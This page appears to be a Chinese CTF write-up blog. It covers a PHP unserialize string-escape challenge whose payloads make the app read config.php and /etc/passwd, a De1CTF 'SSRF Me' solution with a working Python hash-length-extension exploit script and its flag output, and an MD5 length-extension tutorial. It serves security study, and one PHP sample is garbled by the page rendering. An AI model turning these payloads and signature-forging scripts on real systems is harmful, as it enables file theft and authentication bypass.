<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    <span class="keyword">require_once</span>(<span class="string">'class.php'</span>);</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($_SESSION[<span class="string">'username'</span>] == <span class="keyword">null</span>) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">'Login First'</span>); </span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    $username = $_SESSION[<span class="string">'username'</span>];</span></span><br><span class="line"><span class="php">    $profile=$user-&gt;show_profile($username);</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($profile  == <span class="keyword">null</span>) &#123;</span></span><br><span class="line"><span class="php">        header(<span class="string">'Location: update.php'</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">        $profile = unserialize($profile);</span></span><br><span class="line"><span class="php">        $phone = $profile[<span class="string">'phone'</span>];</span></span><br><span class="line"><span class="php">        $email = $profile[<span class="string">'email'</span>];</span></span><br><span class="line"><span class="php">        $nickname = $profile[<span class="string">'nickname'</span>];</span></span><br><span class="line"><span class="php">        $photo = base64_encode(file_get_contents($profile[<span class="string">'photo'</span>]));</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>想要拿文件中的flag 思路很明确 用$photo来读取config.php<br>所以问题肯定在反序列化那里，测试一下发现</p>
<p>只要能构造这样的字符，就能让config.php赋给$photo</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">a:</span><span class="number">4</span>:&#123;<span class="string">s:</span><span class="number">5</span>:<span class="string">"phone"</span>;<span class="string">s:</span><span class="number">11</span>:<span class="string">"13587819970"</span>;<span class="string">s:</span><span class="number">5</span>:<span class="string">"email"</span>;<span class="string">s:</span><span class="number">32</span>:<span class="string">"aaaaaaaaaa@aaaaaaaaaa.aaaaaaaaaa"</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"nickname"</span>;<span class="string">s:</span><span class="number">10</span>:<span class="string">"12345hacke"</span>;<span class="string">s:</span><span class="number">5</span>:<span class="string">"photo"</span>;<span class="string">s:</span><span class="number">10</span>:<span class="string">"config.php"</span>;&#125;<span class="string">s:</span><span class="number">39</span>:<span class="string">"upload/f47454d1d3644127f42070181a8b9afc"</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>给出测试页面的源码</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$profile</span>='a:4:&#123;s:5:<span class="string">"phone"</span>;s:11:<span class="string">"13587819970"</span>;s:5:<span class="string">"email"</span>;s:32:<span class="string">"aaaaaaaaaa@aaaaaaaaaa.aaaaaaaaaa"</span>;s:8:<span class="string">"nickname"</span>;s:10:<span class="string">"12345hacke"</span>;s:5:<span class="string">"photo"</span>;s:10:<span class="string">"config.php"</span>;&#125;s:39:<span class="string">"upload/f47454d1d3644127f42070181a8b9afc"</span>;&#125;';</span><br><span class="line"></span><br><span class="line">#<span class="variable">$profile</span>='wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class="string">";&#125;s:5:"</span>photo<span class="string">";s:11:"</span>/etc/passwd";&#125;';</span><br><span class="line"></span><br><span class="line">#<span class="variable">$profile</span>='wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class="string">";&#125;s:5:"</span>photo<span class="string">";s:10:"</span>config.php";&#125;'</span><br><span class="line"></span><br><span class="line"><span class="variable">$profile</span> = unserialize(<span class="variable">$profile</span>);</span><br><span class="line"><span class="variable">$phone</span> = <span class="variable">$profile</span>['phone'];</span><br><span class="line"><span class="variable">$email</span> = <span class="variable">$profile</span>['email'];</span><br><span class="line"><span class="variable">$nickname</span> = <span class="variable">$profile</span>['nickname'];</span><br><span class="line"><span class="variable">$photo</span> = base64_encode(file_get_contents(<span class="variable">$profile</span>['photo']));</span><br><span class="line">echo <span class="variable">$phone</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">echo <span class="variable">$email</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">echo <span class="variable">$nickname</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">echo <span class="variable">$photo</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">echo str_replace(<span class="string">"&lt;?"</span>,<span class="string">""</span>,base64_decode(<span class="variable">$photo</span>));</span><br></pre></td></tr></table></figure>

<p>以及测试图 注意config.php 要与test.php同目录</p>
<p><a href="http://www.yqxiaojunjie.com/usr/uploads/2016/03/453974656.png" target="_blank" rel="noopener"><img src="http://www.yqxiaojunjie.com/usr/uploads/2016/03/453974656.png" alt="0ctf2.png"></a></p>
<p>问题就在于 怎么创建一个这样的字符串</p>
<p>看到 update.php 中 第3个正则明显和前俩个不同</p>
<p><a href="http://www.yqxiaojunjie.com/usr/uploads/2016/03/669185281.png" target="_blank" rel="noopener"><img src="http://www.yqxiaojunjie.com/usr/uploads/2016/03/669185281.png" alt="0ctf3.png"></a></p>
<p>想到可以用数组绕过</p>
<p><a href="http://www.yqxiaojunjie.com/usr/uploads/2016/03/1613859503.png" target="_blank" rel="noopener"><img src="http://www.yqxiaojunjie.com/usr/uploads/2016/03/1613859503.png" alt="0ctf4.png"></a></p>
<p>我们已经能修改序列化的值了，但是总是被双引号包住，怎么逃逸呢？看这里</p>
<p><a href="http://www.yqxiaojunjie.com/usr/uploads/2016/03/980399706.png" target="_blank" rel="noopener"><img src="http://www.yqxiaojunjie.com/usr/uploads/2016/03/980399706.png" alt="0ctf5.png"></a></p>
<p>这段代码确实没有问题，但重点在于，他是在序列化之后执行的</p>
<p><a href="http://www.yqxiaojunjie.com/usr/uploads/2016/03/67063314.png" target="_blank" rel="noopener"><img src="http://www.yqxiaojunjie.com/usr/uploads/2016/03/67063314.png" alt="0ctf6.png"></a></p>
<p>update_profile 调用了 filter</p>
<p><a href="http://www.yqxiaojunjie.com/usr/uploads/2016/03/641944995.png" target="_blank" rel="noopener"><img src="http://www.yqxiaojunjie.com/usr/uploads/2016/03/641944995.png" alt="0ctf7.png"></a></p>
<p>这会有什么影响呢？举个例子</p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">s:</span><span class="string">"10"</span>:<span class="string">"where1234"</span><span class="string">";  =&gt;  s:10:"</span>hacker1234<span class="string">""</span></span><br></pre></td></tr></table></figure>

<p>在反序列化的时候，前者的值是where1234”,而后者的值是hacker1234</p>
<p><a href="http://www.yqxiaojunjie.com/usr/uploads/2016/03/3969383507.png" target="_blank" rel="noopener"><img src="http://www.yqxiaojunjie.com/usr/uploads/2016/03/3969383507.png" alt="0ctf8.png"></a></p>
<p>逃逸了一个字符 而我们要逃逸 “;}s:5:”photo”;s:10:”config.php”;} 34个字符才可以读取flag</p>
<p>所以payload如下</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere</span>";&#125;<span class="selector-tag">s</span><span class="selector-pseudo">:5</span><span class="selector-pseudo">:"photo"</span>;<span class="selector-tag">s</span><span class="selector-pseudo">:10</span><span class="selector-pseudo">:"config.php"</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>抓包，改nickname为nickname[]，所以我们要溢出的语句 <strong>“;}s:5:”photo”;s:10:”config.php”;}</strong>第一个花括号是为了闭合数组nickname，第二个花括号是闭合对象数组。</p>
<p>### </p>
<h3 id="SSRF-ME-（hash拓展攻击，代码审计）"><a href="#SSRF-ME-（hash拓展攻击，代码审计）" class="headerlink" title="SSRF ME （hash拓展攻击，代码审计）"></a>SSRF ME （hash拓展攻击，代码审计）</h3><p>这是之前De1CTF的那个题，看大家都是用的hash拓展攻击。</p>
<p>wp参考：<a href="https://www.zhaoj.in/read-6170.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-6170.html</a></p>
<p>步骤：</p>
<p>1、先打开靶机看看，一打开就是源码。</p>
<p><img src="https://www.zhaoj.in/wp-content/uploads/2019/08/1565016040e046541f4c491172168358d736c682a0-1024x413.png" alt="img"></p>
<p>右键查看源代码即可查看到换行之后的代码。</p>
<p><img src="https://www.zhaoj.in/wp-content/uploads/2019/08/15650161827a8350d261e89b43a7875a69e1385351-1024x870.png" alt="img"></p>
<p>2、审计代码，可以看到有三个路由。分别看看代码，了解一下他们各自的功能。</p>
<p><img src="https://www.zhaoj.in/wp-content/uploads/2019/08/1565016295020cfafb6f86105eb5f9f4508327963b-1024x452.png" alt="img"></p>
<ul>
<li>/：首页，获取源码</li>
<li>/geneSign：获取 param 参数，结合预设的 action scan 来调用 getSign 函数来生成签名。</li>
<li>/Delta：从 cookie 里获取 action 和 sign，再获取 param 参数，结合 ip 构造一个 Task 类的对象，再以 json 返回其 Exec 方法的执行结果。</li>
</ul>
<p>3、再来看到 getSign 函数。</p>
<p><img src="https://www.zhaoj.in/wp-content/uploads/2019/08/1565016962500d072dbb06299410627b01623179a6-1024x80.png" alt="img"></p>
<p>是将 secert_key 和 param 和 action 拼在一起 md5 了。</p>
<p>4、然后来看到 waf 函数。</p>
<p><img src="https://www.zhaoj.in/wp-content/uploads/2019/08/156501727966710200106b4468d31ee3cc00c7c39d-1024x239.png" alt="img"></p>
<p>找 gopher 和 file 开头的，和调用处的判断结合起来看，是过滤掉了。</p>
<p>5、再来看到 Task 类的 Exec 方法。</p>
<p><img src="https://www.zhaoj.in/wp-content/uploads/2019/08/15650177742912f5f5f0609ddac58d95490eb5b394-1024x548.png" alt="img"></p>
<p>先看 action 里有没有 scan，有的话就调用 scan 方法来读取内容并写到沙盒下的 result.txt 文件。</p>
<p><img src="https://www.zhaoj.in/wp-content/uploads/2019/08/1565017871bc3833fe252b91aac49e12fa130c29af.png" alt="img"></p>
<p>再就是看 action 里有没有 read，有的话就读出里面的内容，返回。</p>
<p>6、审计完代码，需求就很明确了：</p>
<ul>
<li>读取 flag.txt 到 result.txt。</li>
<li>展示 result.txt 的内容。</li>
</ul>
<p>7、上面的签名生成只生成了 action 为 scan 的签名。但注意到</p>
<p><img src="https://www.zhaoj.in/wp-content/uploads/2019/08/1565016962500d072dbb06299410627b01623179a6-1024x80.png" alt="img"></p>
<p>这里算 md5 时 param，action 可控，并且 action 在最后，这样我们就可以利用哈希长度扩展攻击，在 action 后面拼接上我们想要的东西，并且预测出拼接之后的 md5。这里我们就可以在 scan 后面拼上 read 了。</p>
<p>8、而我们看到 scan 那个函数那，用的是 urlopen，这里有两种办法可以读取到本地文件。</p>
<ul>
<li>直接写文件名，前面啥都别带。</li>
<li>local_file: ,参考 <a href="https://bugs.python.org/issue35907" target="_blank" rel="noopener">https://bugs.python.org/issue35907</a></li>
</ul>
<p>用这两种方式之一书写 param 参数即可。</p>
<p>9、所以最终 exp 如下：</p>
<figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">'flag.txt'</span></span><br><span class="line"></span><br><span class="line"># url = <span class="string">'local-file:/etc/passwd'</span></span><br><span class="line"></span><br><span class="line">r = requests.<span class="built_in">get</span>(<span class="string">'http://web68.buuoj.cn/geneSign'</span>, params=&#123;<span class="string">'param'</span>: url&#125;)</span><br><span class="line"></span><br><span class="line">sign = r.<span class="built_in">text</span></span><br><span class="line"></span><br><span class="line">hash_sign = hashpumpy.hashpump(sign, url + <span class="string">'scan'</span>, <span class="string">'read'</span>, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(hash_sign)</span><br><span class="line"></span><br><span class="line">r = requests.<span class="built_in">get</span>(<span class="string">'http://web68.buuoj.cn/De1ta'</span>, params=&#123;<span class="string">'param'</span>: url&#125;, cookies=&#123;</span><br><span class="line"></span><br><span class="line">    <span class="string">'sign'</span>: hash_sign[<span class="number">0</span>],</span><br><span class="line"></span><br><span class="line">    <span class="string">'action'</span>: urllib.parse.quote(hash_sign[<span class="number">1</span>][len(url):])</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(urllib.parse.quote(hash_sign[<span class="number">1</span>][len(url):]))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.<span class="built_in">text</span>)</span><br></pre></td></tr></table></figure>

<p>运行。</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">('<span class="number">8</span>d<span class="number">0</span>cd<span class="number">1</span>da<span class="number">3</span>ffef<span class="number">1</span>d<span class="number">8e812</span>f<span class="number">002</span>b<span class="number">5580</span>ad<span class="number">6</span>', b'flag.txtscan\<span class="keyword">x</span><span class="number">80</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\xe<span class="number">0</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>read')</span><br><span class="line">scan<span class="symbol">%80</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%E0</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span>read</span><br><span class="line">&#123;<span class="string">"code"</span>: <span class="number">200</span>, <span class="string">"data"</span>: <span class="string">"flag&#123;0o5j7hzattbkn2b48r0a67e8j5anakyj&#125;\n"</span>&#125;</span><br></pre></td></tr></table></figure>

<h4 id="哈希长度拓展攻击"><a href="#哈希长度拓展攻击" class="headerlink" title="哈希长度拓展攻击"></a>哈希长度拓展攻击</h4><p>参考<a href="https://blog.csdn.net/syh_486_007/article/details/51228628" target="_blank" rel="noopener">https://blog.csdn.net/syh_486_007/article/details/51228628</a></p>
<p>起因<br>这是 ISCC 上的一道题目，抄 PCTF 的，并且给予了简化。在利用简化过的方式通过后，突然想起利用哈希长度扩展攻击来进行通关。哈希长度扩展攻击是一个很有意思的东西，利用了 md5、sha1 等加密算法的缺陷，可以在不知道原始密钥的情况下来进行计算出一个对应的 hash 值。<br>这里是 ISCC 中题目中的 admin.php 的算法：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$auth = <span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">"auth"</span>])) &#123;</span><br><span class="line">   $auth = unserialize($_COOKIE[<span class="string">"auth"</span>]);</span><br><span class="line">   $hsh = $_COOKIE[<span class="string">"hsh"</span>];</span><br><span class="line">   <span class="keyword">if</span> ($hsh !== md5($SECRET . strrev($_COOKIE[<span class="string">"auth"</span>]))) &#123;    <span class="comment">//$SECRET is a 8-bit salt</span></span><br><span class="line">     $auth = <span class="keyword">false</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  $auth = <span class="keyword">false</span>;</span><br><span class="line">  $s = serialize($auth);</span><br><span class="line">  setcookie(<span class="string">"auth"</span>, $s);</span><br><span class="line">  setcookie(<span class="string">"hsh"</span>, md5($SECRET . strrev($s)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>了解哈希长度扩展攻击<br>哈希长度扩展攻击适用于加密情况为：hash($SECRET, $message)的情况，其中 hash 最常见的就是 md5、hash1。我们可以在不知道$SECRET的情况下推算出另外一个匹配的值。如上例所给的 PHP 代码：</p>
<p>我们知道md5($SECRET . strrev($_COOKIE[“auth”]))的值<br>我们知道$hsh的值<br>我们可以算出另外一个 md5 值和另外一个 $hsh 的值，使得 $hsh == md5($SECRET . strrev($_COOKIE[“auth”]))<br>这样即可通过验证。如果要理解哈希长度扩展攻击，我们要先理解消息摘要算法的实现。以下拿 md5 算法举例。</p>
<p>md5 算法实现<br>我们要实现对于字符串abc的 md5 的值计算。首先我们要把其转化为 16 进制。 </p>
<p>补位<br>消息必须进行补位，即使得其长度在对 512 取模后的值为 448。也就是说，len(message) % 512 == 448。当消息长度不满 448 bit 时（注意是位，而不是字符串长度），消息长度达到 448 bit 即可。当然，如果消息长度已经达到 448 bit，也要进行补位。补位是必须的。<br>补位的方式的二进制表示是在消息的后面加上一个1，后面跟着无限个0，直到 len(message) % 512 == 448。在 16 进制下，我们需要在消息后补80，就是 2 进制的10000000。我们把消息abc进行补位到 448 bit，也就是 56 byte。 </p>
<p>补长度<br>补位过后，第 57 个字节储存的是补位之前的消息长度。abc是 3 个字母，也就是 3 个字节，24 bit。换算成 16 进制为 0x18。其后跟着 7 个字节的 0x00，把消息补满 64 字节。 </p>
<p>计算消息摘要<br>计算消息摘要必须用补位已经补长度完成之后的消息来进行运算，拿出 512 bit的消息（即64字节）。 计算消息摘要的时候，有一个初始的链变量，用来参与第一轮的运算。MD5 的初始链变量为：</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">A</span>=<span class="number">0</span>x67452301</span><br><span class="line"><span class="attr">B</span>=<span class="number">0</span>xefcdab89</span><br><span class="line"><span class="attr">C</span>=<span class="number">0</span>x98badcfe</span><br><span class="line"><span class="attr">D</span>=<span class="number">0</span>x10325476</span><br></pre></td></tr></table></figure>

<p>我们不需要关心计算细节，我们只需要知道经过一次消息摘要后，上面的链变量将会被新的值覆盖，而最后一轮产生的链变量经过高低位互换（如：aabbccdd -&gt; ddccbbaa）后就是我们计算出来的 md5 值。</p>
<p>哈希长度扩展攻击的实现<br>问题就出在覆盖上。我们在不知道具体 $SECRET 的情况下，得知了其 hash 值，以及我们有一个可控的消息。而我们得到的 hash 值正是最后一轮摘要后的经过高低位互换的链变量。我们可以想像一下，在常规的摘要之后把我们的控制的信息进行下一轮摘要，只需要知道上一轮消息产生的链变量。<br>有点难理解，因为我都看的头大。看起来我们把实现放在攻击场景里会更好。<br>仍然是如上的 PHP。因为其走了一点弯路（strrev、unserialize），所以我们修改一下。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">$auth = "I_L0vE_L0li";</span><br><span class="line">if (isset($_COOKIE["auth"])) &#123;</span><br><span class="line">    $hsh = $_COOKIE["hsh"];</span><br><span class="line">    if ($hsh !== md5($SECRET . $Extra close brace or missing open brace_COOKIE["auth"])) &#123;</span><br><span class="line">        <span class="attribute">die("F4ck_U!");</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    setcookie("auth", $auth);</span><br><span class="line">    setcookie("hsh", md5($SECRET . $auth));</span><br><span class="line">    <span class="attribute">die("F4ck_U!");</span></span><br><span class="line"><span class="attribute">&#125;</span></span><br><span class="line"><span class="attribute">die("I_aM_A_L0li_dA_Yo~");</span></span><br></pre></td></tr></table></figure>

<p>在实际环境中，我不知道 $SECRET 的值（我胡乱打的QAQ），只知道长度为 12。首先我们访问一下看看。不出意外地被 f4ck 了。 </p>
<p>Cookie 中的 auth 为I_L0vE_L0li，hsh 为 7a84f420f8abe642237409f9d4daa851。我们来进行哈希长度扩展攻击。 </p>
<p>长度扩展<br>我们仍然要进行补位。因为 $SECRET 的长度是 12，我们用 12 个 * 来填补一下，紧跟着就是 auth 的值。然后我们把消息补到 448 bit。接着进行补长度。</p>
<p>然后后面跟着要附加的值，随意什么都可以。我这里是I_aM_L01i好了。</p>
<p>然后去掉前面的假的 $SECRET，得到最终的 $auth。 </p>
<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">I_L0vE_L0li<span class="symbol">\x</span>80<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>B8<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00I_aM_L01i</span><br></pre></td></tr></table></figure>

<p>urlencode之后为</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">I_L<span class="number">0</span>vE_L<span class="number">0</span>li<span class="meta">%</span><span class="number">80</span><span class="meta">%</span><span class="number">00</span><span class="meta">%</span><span class="number">00</span><span class="meta">%</span><span class="number">00</span><span class="meta">%</span><span class="number">00</span><span class="meta">%</span><span class="number">00</span><span class="meta">%</span><span class="number">00</span><span class="meta">%</span><span class="number">00</span><span class="meta">%</span><span class="number">00</span><span class="meta">%</span><span class="number">00</span><span class="meta">%</span><span class="number">00</span><span class="meta">%</span><span class="number">00</span><span class="meta">%</span><span class="number">00</span><span class="meta">%</span><span class="number">00</span><span class="meta">%</span><span class="number">00</span><span class="meta">%</span><span class="number">00</span><span class="meta">%</span><span class="number">00</span><span class="meta">%</span><span class="number">00</span><span class="meta">%</span><span class="number">00</span><span class="meta">%</span><span class="number">00</span><span class="meta">%</span><span class="number">00</span><span class="meta">%</span><span class="number">00</span><span class="meta">%</span><span class="number">00</span><span class="meta">%</span><span class="number">00</span><span class="meta">%</span><span class="number">00</span><span class="meta">%</span><span class="number">00</span><span class="meta">%</span><span class="number">00</span><span class="meta">%</span><span class="number">00</span><span class="meta">%</span><span class="number">00</span><span class="meta">%</span><span class="number">00</span><span class="meta">%</span><span class="number">00</span><span class="meta">%</span><span class="number">00</span><span class="meta">%</span><span class="number">00</span><span class="meta">%</span>B<span class="number">8</span><span class="meta">%</span><span class="number">00</span><span class="meta">%</span><span class="number">00</span><span class="meta">%</span><span class="number">00</span><span class="meta">%</span><span class="number">00</span><span class="meta">%</span><span class="number">00</span><span class="meta">%</span><span class="number">00</span><span class="meta">%</span><span class="number">00</span>I_aM_L<span class="number">01</span>i</span><br></pre></td></tr></table></figure>

<p>计算哈希<br>我在网上找了一个 C 语言的 md5 实现。因为 Python 的实现不能改初始的链变量。我修改了初始的链变量为经过高低位逆转的 $hsh。<br>PS：原来的是7a84f420f8abe642237409f9d4daa851</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">A</span>=<span class="number">0</span>x20f4847a</span><br><span class="line"><span class="attr">B</span>=<span class="number">0</span>x42e6abf8</span><br><span class="line"><span class="attr">C</span>=<span class="number">0</span>xf9097423</span><br><span class="line"><span class="attr">D</span>=<span class="number">0</span>x51a8dad4</span><br></pre></td></tr></table></figure>

<p>然后我们对附加的值进行 md5 加密。附加的值为I_aM_L01i。首先我们把前面 64 个字节改为 64 个A。这是为了使得除了 hash 本身以外其他的状态完全一样（原文：Then we take the MD5 of 64 ‘A’s. We take the MD5 of a full (64-byte) block of ‘A’s to ensure that any internal values — other than the state of the hash itself — are set to what we expect）。实际上，前 64 个字节填充什么都无所谓。因为在进行我们的附加值的摘要之前，我们已经把链变量覆盖了。<br>然后我们编译并运行这个加密实现。<br>得到了一串密文，是1d00eac3f7da072d8365b0a7ae1fec42。我们用 Firefox 的 firebug 插件进行修改 Cookie。<br>刷新后发现已经通过验证。</p>
<p>总结<br>看起来很难理解，我本人也通宵了一晚上才搞定。当然因为我比较笨QAQ。总之，这是个很好玩的东西，大家可以去复现一下。<br>另外这个问题的解决方案为：hash($SECRET, hash($message))。这样就可以避免用户可控 message 了。</p>
<p>参考：<a href="https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks" target="_blank" rel="noopener">https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks</a></p>
<p>在大佬的评论中发现一个简单地对哈希长度拓展攻击的描述</p>
